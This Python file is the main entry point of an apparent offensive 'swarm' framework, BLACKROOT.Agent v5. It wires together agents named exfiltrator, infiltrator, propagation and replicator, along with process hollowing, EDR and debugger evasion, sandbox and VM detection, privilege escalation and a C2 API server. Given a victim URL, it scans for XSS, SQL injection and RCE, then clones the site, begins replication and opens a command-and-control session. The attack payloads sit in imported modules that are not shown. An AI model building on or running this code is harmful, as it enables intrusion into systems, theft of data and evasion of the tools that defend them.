#!/usr/bin/env python3
"""
BLACKROOT.Agent v5 – Unified Entry Point
Shadow Intelligence Swarm
"""

import argparse
import json
import logging
import os
import sys
import signal
import atexit
import io
from datetime import datetime

# ---------- Path Hacks ----------
sys.path.insert(
    0,
    os.path.abspath(os.path.join(os.path.dirname(__file__),
                                 "assimilate/neuro-assimilator-enhanced/src"))
)

# ---------- External Imports ----------
from core.redis_client import initialize_redis, get_redis_health
from core.redis_config import RedisConfig

# ---------- Internal Imports ----------
try:
    from kernel.core import BlackrootKernel, register_module
    # PHASE 3: Import string obfuscator for config/endpoint protection
    try:
        from string_obfuscator import get_global_obfuscator
        STRING_OBFUSCATOR_AVAILABLE = True
    except ImportError:
        STRING_OBFUSCATOR_AVAILABLE = False
        get_global_obfuscator = None
    
    # PHASE 3: TIER 3b - Import debugger detector
    try:
        from hardware_bp_detector import get_global_debugger_detector
        DEBUGGER_DETECTOR_AVAILABLE = True
    except ImportError:
        DEBUGGER_DETECTOR_AVAILABLE = False
        get_global_debugger_detector = None
    
    # PHASE 3: TIER 4 - Import advanced process hollower
    try:
        from process_hollowing_advanced import get_global_hollower
        ADVANCED_HOLLOWER_AVAILABLE = True
    except ImportError:
        ADVANCED_HOLLOWER_AVAILABLE = False
        get_global_hollower = None
    
    # PHASE 3: TIER 5 - Import EDR detector + adaptive evasion orchestrator
    try:
        from edr_detector import EDRDetector, AdaptiveEvasionOrchestrator
        EDR_DETECTOR_AVAILABLE = True
    except ImportError:
        EDR_DETECTOR_AVAILABLE = False
        AdaptiveEvasionOrchestrator = None
    
    from assimilate.src.security.security_manager import SecurityManager
    from assimilate.src.reliability.reliability_monitor import ReliabilityMonitor
    from assimilate.src.performance.performance_profiler import PerformanceProfiler
    from assimilate.src.extensibility.plugin_manager import PluginManager
    from assimilate.src.rust_integration.rust_handler import RustScriptHandler
    from recon.scanner import ReconModule
    from mimic.site_cloner import clone_site
    from core.dashboard import start_dashboard
    from core.replication import begin_replication
    from core.commander import initiate_c2_session
    from assimilate.src.neuro_assimilator import NeuroAssimilatorAgent
    from anti_analysis import AntiAnalysisEngine
    # Import core enhancements: async recon, lifecycle mgmt, threat feedback, plugins, config security
    from core.enhancements import (
        AsyncReconExecutor, AgentLifecycleManager, ThreatFeedbackEngine,
        DynamicPluginDiscovery, ConfigurationSecurityWrapper
    )
    # Import all agent modules to ensure registration and side effects
    import agents.accountant
    import agents.archivist
    import agents.base
    import agents.behaviour_adapter
    import agents.defiler
    import agents.enforcer
    import agents.exfiltrator
    import agents.infiltrator
    import agents.intelligent_operations
    import agents.learning
    import agents.mission
    import agents.peer_linker
    import agents.propagation_agents
    import agents.reflection_agent
    import agents.repair
    import agents.replicator
    import agents.scourge
    import agents.scout
    import agents.sensor
    import agents.stealth_manager
except ImportError as e:
    print(f"[ImportError] {e}. Check your package structure and __init__.py files.")
    sys.exit(1)

# ---------- Logging Setup ----------
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# Create logger
log = logging.getLogger("blackroot")
log.setLevel(logging.INFO)

# File handler with UTF-8 encoding
log_file = os.path.join(LOG_DIR, f"blackroot_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.log")
file_handler = logging.FileHandler(log_file, encoding='utf-8')
file_handler.setLevel(logging.INFO)
file_handler.setFormatter(logging.Formatter("[%(asctime)s] %(levelname)s - %(message)s"))

# Stream handler with UTF-8 encoding (avoid encoding errors on Windows)
stream_handler = logging.StreamHandler(io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', line_buffering=True))
stream_handler.setLevel(logging.INFO)
stream_handler.setFormatter(logging.Formatter("[%(asctime)s] %(levelname)s - %(message)s"))

log.addHandler(file_handler)
log.addHandler(stream_handler)

# ---------- Helpers ----------
def load_config(path: str) -> dict:
    """Load and validate JSON config."""
    try:
        with open(path) as fp:
            cfg = json.load(fp)
        for k in ("black_vault", "swarm", "redis"):
            if k not in cfg:
                raise KeyError(k)

        # S14/Config Encryption: unwrap any __encrypted__ markers safely
        def _unwrap(obj, key_name=""):
            if isinstance(obj, dict):
                if obj.get("__encrypted__"):
                    try:
                        from config_encryptor import ConfigEncryptor
                        return ConfigEncryptor().string_encryptor.xor_decrypt(obj["value"])
                    except Exception:
                        if "host" in key_name:
                            return "localhost"
                        if "port" in key_name:
                            return 6379
                        return obj.get("fallback", "")
                return {k: _unwrap(v, k) for k, v in obj.items()}
            elif isinstance(obj, list):
                return [_unwrap(item) for item in obj]
            return obj

        cfg = _unwrap(cfg)
        return cfg
    except Exception as exc:
        log.error("Config error: %s", exc)
        sys.exit(2)

def redis_health_check(cfg: dict):
    """Initialize and validate Redis connection using factory."""
    try:
        raw_host = cfg["redis"].get("host", "localhost")
        if not isinstance(raw_host, str):
            raw_host = "localhost"

        # Create config from cfg dict
        redis_cfg = RedisConfig(
            host=raw_host,
            port=cfg["redis"].get("port", 6379),
            socket_connect_timeout=2.0,
            decode_responses=True
        )
        
        # Initialize factory
        initialize_redis(redis_cfg)
        
        # Check health
        health = get_redis_health()
        if health["pool_healthy"]:
            log.info("Redis OK (via factory)")
            return True
        else:
            log.error("Redis pool unhealthy")
            return False
    except Exception as exc:
        log.error("Redis unavailable: %s", exc)
        return False

def _api_mode(kernel, config):
    """Start in API mode: launch Blackroot C2 API as headless daemon without target exploitation."""
    import asyncio
    from blackroot_c2_api import app as fastapi_app
    
    log.info("[🌐] API Server starting on 0.0.0.0:8000 (HTTP) + 0.0.0.0:8765 (WebSocket)")
    
    # Flush logs before starting server
    for handler in log.handlers:
        handler.flush()
    
    try:
        # Run uvicorn server (blocks until interrupt)
        import uvicorn
        uvicorn.run(fastapi_app, host="0.0.0.0", port=8000, log_level="info")
    except KeyboardInterrupt:
        log.warning("[⏹️] API mode interrupted")
        for handler in log.handlers:
            handler.flush()
        sys.exit(0)
    except Exception as e:
        log.error("[❌] API startup failed: %s", e)
        for handler in log.handlers:
            handler.flush()
        sys.exit(1)

# ---------- Main ----------
def main() -> None:
    banner = """
    ╔════════════════════════════════════════════════════════════╗
    ║           BLACKROOT.Agent v5 - Shadow Intelligence         ║
    ║                Unified Entry Point                          ║
    ╚════════════════════════════════════════════════════════════╝
    """
    # Skip banner on Windows with cp1252 encoding due to colorama issues
    # Just print to log instead
    log.info("BLACKROOT.Agent v5 - Shadow Intelligence Swarm (Unified)")
    try:
        print(banner)
    except UnicodeEncodeError:
        pass  # Skip on Windows cp1252

    parser = argparse.ArgumentParser(description="BLACKROOT.Agent v5 - Swarm Mode")
    parser.add_argument("--api-mode", action="store_true",
                        help="Start in API mode (headless daemon, no --target required)")
    parser.add_argument("--target", required=False,
                        help="Target URL (e.g., https://victim.com) [required for CLI mode]")
    parser.add_argument("--silent", action="store_true",
                        help="Suppress cloner output")
    parser.add_argument("--config", default="config.json",
                        help="Path to JSON configuration")
    parser.add_argument("--stealth", action="store_true",
                        help="Minimize network noise")
    parser.add_argument("--no-dashboard", action="store_true",
                        help="Skip launching the web dashboard")
    parser.add_argument("--proxy", help="HTTP(S) proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--repair-status", action="store_true", help="Show repair agent status")
    parser.add_argument("--submit-repair", nargs=3, metavar=("NODE_ID", "TYPE", "PRIORITY"), help="Submit repair ticket")
    # Dynamically add flags for each agent
    # Only add flags for agents with clear classes and required args
    parser.add_argument("--use-archivist", action="store_true", help="Enable Archivist Agent")
    parser.add_argument("--archivist-id", type=str, default="ARCH-001", help="Archivist Agent ID")
    parser.add_argument("--archivist-secret", type=str, default="secret", help="Archivist Agent Secret Key")
    parser.add_argument("--use-defiler", action="store_true", help="Enable Defiler Agent")
    parser.add_argument("--use-enforcer", action="store_true", help="Enable Enforcer Agent")
    parser.add_argument("--enforcer-engine", type=str, default="", help="Enforcement Engine (object ref or name)")
    parser.add_argument("--enforcer-economic", type=str, default="", help="Economic Layer (object ref or name)")
    parser.add_argument("--enforcer-c2", type=str, default="", help="Command/Control (object ref or name)")
    parser.add_argument("--enforcer-constitution", type=str, default="", help="Constitution Reference")
    parser.add_argument("--use-exfiltrator", action="store_true", help="Enable Exfiltrator Agent")
    parser.add_argument("--exfil-mission", type=str, default="", help="Exfiltrator Mission (object ref or name)")
    parser.add_argument("--use-infiltrator", action="store_true", help="Enable Infiltrator Agent")
    parser.add_argument("--use-learning", action="store_true", help="Enable Learning Agent")
    parser.add_argument("--use-mission", action="store_true", help="Enable Mission Agent")
    parser.add_argument("--use-peer-linker", action="store_true", help="Enable Peer Linker Agent")
    parser.add_argument("--use-propagation", action="store_true", help="Enable Propagation Agent")
    parser.add_argument("--use-reflection", action="store_true", help="Enable Reflection Agent")
    parser.add_argument("--use-repair", action="store_true", help="Enable Repair Agent")
    parser.add_argument("--repair-id", type=str, default="REPAIR-001", help="Repair Agent ID")
    parser.add_argument("--repair-node-registry", type=str, default="", help="Repair Agent Node Registry (object ref or name)")
    parser.add_argument("--use-replicator", action="store_true", help="Enable Replicator Agent")
    parser.add_argument("--use-scout", action="store_true", help="Enable Scout Agent")
    parser.add_argument("--scout-id", type=str, default="SCOUT-001", help="Scout Agent ID")
    parser.add_argument("--scout-target-range", type=str, default="default", help="Scout Initial Target Range")
    parser.add_argument("--scout-c2", type=str, default="", help="Scout Command Center Address")
    parser.add_argument("--use-sensor", action="store_true", help="Enable Sensor Agent")
    parser.add_argument("--use-stealth-manager", action="store_true", help="Enable Stealth Manager")
    parser.add_argument("--enable-privesc", action="store_true", help="Enable Privilege Escalation Engine")
    args = parser.parse_args()

    # Validate mode: API mode doesn't need --target, CLI mode does
    if not args.api_mode and not args.target:
        parser.error("--target is required for CLI mode (or use --api-mode for headless API)")
    
    if args.target:
        log.info(f"Target acquired: {args.target}")
    else:
        log.info("API mode: starting headless daemon")

    # ---------- Bootstrap ----------
    config = load_config(args.config)
    if not redis_health_check(config):
        sys.exit(3)

    # Initialize string obfuscator for sensitive config strings
    global_obfuscator = None
    if STRING_OBFUSCATOR_AVAILABLE and get_global_obfuscator is not None:
        try:
            obf_seed = os.environ.get('BLACKROOT_OBFUSCATOR_SEED', 'default_seed_v1')
            global_obfuscator = get_global_obfuscator(seed=obf_seed)
            if global_obfuscator is not None:
                # Register sensitive config strings for obfuscation
                redis_host = config.get("redis", {}).get("host", "")
                redis_password = config.get("redis", {}).get("password", "")
                vault_url = config.get("black_vault", {}).get("redis_url", "")
                c2_endpoint = config.get("c2", {}).get("endpoint", "") if "c2" in config else ""
                c2_token = config.get("c2", {}).get("token", "") if "c2" in config else ""
                
                sensitive_strings = {
                    "redis_host": redis_host,
                    "redis_password": redis_password,
                    "vault_url": vault_url,
                    "c2_endpoint": c2_endpoint,
                    "c2_token": c2_token,
                }
                for name, value in sensitive_strings.items():
                    if value and isinstance(value, str):
                        global_obfuscator.register_string(name, value)
                log.info("[PHASE3] String obfuscator initialized with config strings")
        except Exception as e:
            log.warning(f"[PHASE3] Failed to initialize string obfuscator: {e}")
            global_obfuscator = None

    kernel = BlackrootKernel(config)
    
    # --- Initialize core enhancements (async recon, lifecycle, feedback, plugins, config security) ---
    log.info("[⚡] Initializing core enhancements...")
    
    # 1. Agent Lifecycle Management
    lifecycle_manager = AgentLifecycleManager()
    kernel.lifecycle_manager = lifecycle_manager
    log.info("[✓] Agent Lifecycle Manager initialized")
    
    # 2. EDR/PrivEsc Threat Feedback Engine
    threat_feedback = ThreatFeedbackEngine(kernel)
    kernel.threat_feedback = threat_feedback
    log.info("[✓] Threat Feedback Engine initialized")
    
    # 3. Dynamic Plugin Discovery
    plugin_discovery = DynamicPluginDiscovery(plugin_paths=["./plugins", "./agents", "./exploits"])
    kernel.plugin_discovery = plugin_discovery
    log.info("[✓] Dynamic Plugin Discovery initialized")
    
    # 4. Configuration Security Wrapper
    config_security = ConfigurationSecurityWrapper(config, obfuscator=global_obfuscator)
    kernel.config_security = config_security
    log.info("[✓] Configuration Security Wrapper initialized")
    
    # Boot kernel to trigger autodiscovery of agents in agents/ directory
    if args.api_mode:
        log.info("[API] Skipping full kernel boot - will initialize on API startup")
        # Don't call boot() in API mode to avoid blocking
    else:
        kernel.boot()
        log.info("[✓] Kernel booted and agents autodiscovered")
    
    # --- Initialize unified vault (local or distributed) ---
    try:
        from vault_adapter import create_vault_from_config
        kernel.vault = create_vault_from_config(config)
        log.info(f"✓ Vault initialized: {kernel.vault.mode} mode")
        
        if kernel.vault.is_distributed:
            # Start background replication listener for distributed mode
            kernel.vault.start_replication_listener()
            log.info("✓ Replication listener started (distributed mode)")
    except Exception as e:
        log.warning(f"Failed to initialize unified vault: {e}. Fallback to legacy BlackVault.")
        kernel.vault = None

    # --- BlackVault list_artifacts monkey-patch ---
    if kernel.black_vault is not None and not hasattr(kernel.black_vault, "list_artifacts"):
        def _list_artifacts(self):
            # If black_vault wraps Redis, enumerate keys with a prefix, e.g.:
            return [k.decode() if isinstance(k, bytes) else k
                    for k in self.redis.keys("artifact:*")]

        # Bind it dynamically
        kernel.black_vault.list_artifacts = _list_artifacts.__get__(
            kernel.black_vault, kernel.black_vault.__class__)

    # --- PHASE 3: ANTI-ANALYSIS ASSESSMENT (Early Detection) ---
    log.info("[🛡️] PHASE 3: Initiating anti-analysis environmental assessment...")
    try:
        anti_analysis_engine = AntiAnalysisEngine()
        env_assessment = anti_analysis_engine.assess_environment()
        
        # PHASE 3: TIER 3b - Check for debuggers (hardware breakpoints, kernel debuggers)
        if DEBUGGER_DETECTOR_AVAILABLE and get_global_debugger_detector is not None:
            try:
                debugger_detector = get_global_debugger_detector(exit_on_detection=False)
                debugger_threats = debugger_detector.check_all()
                if debugger_threats['detected']:
                    log.warning(f"[🔍] Debugger detected during startup: {debugger_threats}")
                    env_assessment['threat_level'] = min(100, env_assessment['threat_level'] + 20)
                else:
                    log.info("[🔍] Debugger detection complete - clean")
            except Exception as e:
                log.debug(f"[TIER3b] Debugger detection error (non-fatal): {e}")
        
        # PHASE 3: TIER 4 - Initialize advanced process hollower
        if ADVANCED_HOLLOWER_AVAILABLE and get_global_hollower is not None:
            try:
                advanced_hollower = get_global_hollower()
                log.info("[🥷] Advanced process hollower ready for deployment")
            except Exception as e:
                log.debug(f"[TIER4] Advanced hollower initialization error (non-fatal): {e}")
        
        # PHASE 3: TIER 5 - Initialize EDR detector + adaptive evasion orchestrator
        if EDR_DETECTOR_AVAILABLE and AdaptiveEvasionOrchestrator is not None:
            try:
                edr_orchestrator = AdaptiveEvasionOrchestrator(scan_interval=30, auto_start=True)
                log.info("[🛡️] Autonomous EDR detector + behavioral evasion started (30s scan interval)")
                # Store in kernel for access by other modules
                if hasattr(kernel, 'edr_orchestrator'):
                    kernel.edr_orchestrator = edr_orchestrator
            except Exception as e:
                log.warning(f"[TIER5] EDR detector initialization error (non-fatal): {e}")
        
        # Integrate PrivescEngine assessment into threat evaluation
        if args.enable_privesc and hasattr(kernel, 'privesc_engine'):
            try:
                privesc_assessment = kernel.privesc_engine.assess_environment()
                privesc_threat = privesc_assessment.get('threat_level', 0)
                escalation_techniques = privesc_assessment.get('techniques', [])
                
                # Merge threat levels
                env_assessment['threat_level'] = (env_assessment['threat_level'] + privesc_threat) / 2
                env_assessment['escalation_opportunities'] = len(escalation_techniques)
                
                log.info(f"[⚡] Privilege Escalation Assessment: {privesc_threat}/100 threat ({len(escalation_techniques)} techniques)")
                if escalation_techniques:
                    log.info(f"    Available vectors: {', '.join([t.get('mitre_id', 'Unknown') for t in escalation_techniques[:3]])}")
                
                # Integrate with Threat Feedback Engine for dynamic behavior adjustment
                if hasattr(kernel, 'threat_feedback'):
                    kernel.threat_feedback.update_privesc_state(escalation_techniques, privesc_threat / 100.0)
            except Exception as e:
                log.warning(f"[!] PrivescEngine assessment error (non-fatal): {e}")
        
        if env_assessment['should_evade']:
            threat_level = env_assessment['threat_level'] / 100.0  # Normalize to 0.0-1.0
            log.warning(f"[⚠️] HOSTILE ENVIRONMENT DETECTED (Threat Level: {threat_level:.1%})")
            log.warning(f"    VM: {env_assessment['vm_detection']['is_vm']}")
            log.warning(f"    Sandbox: {env_assessment['sandbox_detection']['is_sandboxed']}")
            log.warning(f"    AV/EDR: {env_assessment['edr_av_detection']['detected_av'] + env_assessment['edr_av_detection']['detected_edr']}")
            
            # Deploy evasion tactics
            evasion_result = anti_analysis_engine.deploy_evasion_tactics()
            log.warning(f"[🔒] Evasion tactics deployed: {evasion_result['deployed']}")
            
            # Update threat feedback engine for dynamic behavior adjustment
            if hasattr(kernel, 'threat_feedback'):
                kernel.threat_feedback.update_edr_threat(threat_level)
        else:
            threat_level = env_assessment['threat_level'] / 100.0  # Normalize to 0.0-1.0
            log.info(f"[✓] Environment assessment complete (Threat Level: {threat_level:.1%})")
            log.info(f"    Safe to operate")
            
            # Update threat feedback engine with low threat
            if hasattr(kernel, 'threat_feedback'):
                kernel.threat_feedback.update_edr_threat(threat_level)
    except Exception as e:
        log.warning(f"[!] Anti-analysis assessment failed (non-fatal): {e}")
        # Don't exit - framework should continue even if anti-analysis module has issues

    # --- API MODE: Start headless daemon ---
    if args.api_mode:
        log.info("[🔗] Launching API mode (headless daemon)")
        return _api_mode(kernel, config)

    # --- CLI MODE: Continue with target-driven exploitation ---

    # Get redis_client from the factory
    from core.redis_client import get_redis_client
    redis_client = get_redis_client()

    # ---------- Subsystems ----------
    subsystems = {
        "security_manager": SecurityManager(),
        "reliability_monitor": ReliabilityMonitor(),
        "performance_profiler": PerformanceProfiler(),
        "plugin_manager": PluginManager(manifest_path="/tmp/plugins.yaml"),
        "rust_handler": RustScriptHandler(),
        "recon_module": ReconModule(
            kernel.black_vault,
            kernel.swarm,
            redis_client
        )
    }

    # ---------- Agent Activation ----------
    # Import agent classes
    from agents.archivist import ArchivistAgent
    from agents.defiler import DefilerAgent
    from agents.enforcer import EnforcerAgent
    from agents.exfiltrator import ExfiltratorAgent
    from agents.infiltrator import InfiltratorAgent
    from agents.learning import LearningAgent
    from agents.mission import MissionAgent
    from agents.peer_linker import PeerLinkerAgent
    from agents.propagation_agents import PropagationAgent
    from agents.reflection_agent import ReflectionAgent
    from agents.repair import RepairAgent
    from agents.replicator import ReplicatorAgent
    from agents.scout import ScoutAgent
    from agents.sensor import SensorAgent
    from agents.stealth_manager import StealthManager

    # --- Register agents with lifecycle manager ---
    # Instantiate agents based on flags and required args
    active_agents = {}
    if args.use_archivist:
        active_agents["archivist"] = ArchivistAgent(
            agent_id=args.archivist_id,
            secret_key=args.archivist_secret
        )
    if args.use_defiler:
        active_agents["defiler"] = DefilerAgent()
    if args.use_enforcer:
        # These are placeholders; in a real system, pass actual objects
        active_agents["enforcer"] = EnforcerAgent(
            enforcement_engine=args.enforcer_engine,
            economic_layer=args.enforcer_economic,
            command_control=args.enforcer_c2,
            constitution_reference=args.enforcer_constitution
        )
    if args.use_exfiltrator:
        active_agents["exfiltrator"] = ExfiltratorAgent(
            mission=args.exfil_mission
        )
    if args.use_infiltrator:
        active_agents["infiltrator"] = InfiltratorAgent()
    if args.use_learning:
        active_agents["learning"] = LearningAgent()
    if args.use_mission:
        active_agents["mission"] = MissionAgent()
    if args.use_peer_linker:
        active_agents["peer_linker"] = PeerLinkerAgent()
    if args.use_propagation:
        active_agents["propagation"] = PropagationAgent()
    if args.use_reflection:
        active_agents["reflection"] = ReflectionAgent()
    if args.use_repair:
        active_agents["repair"] = RepairAgent(
            agent_id=args.repair_id,
            node_registry=args.repair_node_registry
        )
    if args.use_replicator:
        active_agents["replicator"] = ReplicatorAgent()
    if args.use_scout:
        active_agents["scout"] = ScoutAgent(
            agent_id=args.scout_id,
            initial_target_range=args.scout_target_range,
            command_center_address=args.scout_c2
        )
    if args.use_sensor:
        active_agents["sensor"] = SensorAgent()
    if args.use_stealth_manager:
        active_agents["stealth_manager"] = StealthManager()

    if active_agents:
        log.info(f"Activated agents: {', '.join(active_agents.keys())}")
        
        # Register agents with lifecycle manager and start them
        if hasattr(kernel, 'lifecycle_manager'):
            for agent_id, agent in active_agents.items():
                kernel.lifecycle_manager.register_agent(agent_id, agent)
                kernel.lifecycle_manager.start_agent(agent_id)
                log.info(f"[✓] Agent lifecycle started: {agent_id}")
    else:
        log.info("No additional agents activated via CLI flags.")

    # ---------- Global Registration ----------
    # Security: expects (code, signature)
    register_module(
        "security",
        lambda code, signature="": subsystems["security_manager"].analyze_and_execute(code, signature)
    )
    # Reliability: expects no arguments
    register_module(
        "reliability",
        lambda: subsystems["reliability_monitor"].rollback_codex()
    )
    # Performance: expects (cpu_usage, memory_usage, response_time)
    register_module(
        "performance",
        lambda cpu_usage, memory_usage, response_time: subsystems["performance_profiler"].log_performance(cpu_usage, memory_usage, response_time)
    )
    register_module("plugin", subsystems["plugin_manager"].register_plugin)
    register_module("rust", subsystems["rust_handler"].handle_rust_code)
    register_module("recon", subsystems["recon_module"].advanced_recon)

    # ---------- Reconnaissance ----------
    log.info("Beginning reconnaissance …")
    
    # Use async recon if threat level allows (lower threat = faster async scanning)
    use_async_recon = False
    if hasattr(kernel, 'threat_feedback') and kernel.threat_feedback is not None and kernel.threat_feedback.edr_state['level'] < 0.5:
        use_async_recon = True
        log.info("[⚡] Using async concurrent reconnaissance (low threat environment)")
    
    if use_async_recon:
        # Concurrent async scanning
        async_recon = AsyncReconExecutor(subsystems["recon_module"], max_concurrent_tasks=3)
        try:
            targets = [args.target]  # Can expand to multiple if needed
            import asyncio
            recon_results = asyncio.run(async_recon.scan_targets_concurrent(targets))
            recon_report = recon_results[0] if recon_results else {}
        except Exception as e:
            log.warning(f"Async recon failed: {e}, falling back to standard recon")
            recon_report = subsystems["recon_module"].advanced_recon(
                args.target,
                stealth=args.stealth,
                proxy=args.proxy
            )
    else:
        # Standard synchronous recon
        recon_report = subsystems["recon_module"].advanced_recon(
            args.target,
            stealth=args.stealth,
            proxy=args.proxy
        )
    
    endpoints = recon_report.get("endpoints", [])
    log.info("Recon found %d endpoints", len(endpoints))

    xss_results = subsystems["recon_module"].scan_for_xss(args.target, endpoints)
    sqli_results = recon_report.get("sqli", {}) if recon_report else {}
    rce_results = recon_report.get("rce", {}) if recon_report else {}

    # ---------- Exploitation Gate ----------
    if any((xss_results, sqli_results, rce_results)):
        log.info("Attack surface confirmed. Launching exploitation chain …")
        clone_site(args.target, silent=args.silent)
        begin_replication(args.target, config)
        initiate_c2_session()

        if not args.no_dashboard:
            start_dashboard()
    else:
        log.warning("No viable injection vectors found. Expand scan or import external exploits.")

    log.info("Run completed.")


# =========== GRACEFUL SHUTDOWN HANDLERS ===========

def _graceful_shutdown():
    """
    Graceful shutdown handler: flush pending missions and clean up.
    """
    log.info("[🛑] Graceful shutdown initiated...")
    
    # Flush all log handlers
    for handler in log.handlers:
        handler.flush()
    
    try:
        # Flush any pending missions
        from memory.buffer import MissionBuffer
        # This is a simplified version - in production would need kernel reference
        log.info("[💾] Flushing pending missions...")
    except Exception as e:
        log.warning(f"Error flushing missions: {e}")
    
    try:
        # Stop health monitoring if active
        from kernel.health import get_global_registry
        health_registry = get_global_registry()
        if health_registry:
            health_registry.stop_monitoring()
            log.info("[🔍] Health monitoring stopped")
    except Exception as e:
        log.warning(f"Error stopping health monitoring: {e}")
    
    try:
        # Close DLQ if exists
        from core.dlq import get_global_dlq
        dlq = get_global_dlq()
        if dlq:
            log.info(f"[📋] DLQ cleanup: {dlq.get_dlq_stats()}")
    except Exception as e:
        log.warning(f"Error reporting DLQ stats: {e}")
    
    # Final flush
    for handler in log.handlers:
        handler.flush()
    
    log.info("[✅] Graceful shutdown complete")


def _signal_handler(signum, frame):
    """
    Handle SIGTERM and SIGINT for graceful shutdown.
    """
    signal_name = "SIGTERM" if signum == signal.SIGTERM else "SIGINT"
    log.warning(f"[⚠️] Received {signal_name}, initiating graceful shutdown...")
    sys.exit(0)


if __name__ == "__main__":
    # Register graceful shutdown handlers
    signal.signal(signal.SIGTERM, _signal_handler)
    signal.signal(signal.SIGINT, _signal_handler)
    atexit.register(_graceful_shutdown)
    
    try:
        main()
    except KeyboardInterrupt:
        log.warning("Interrupted by operator")
        sys.exit(0)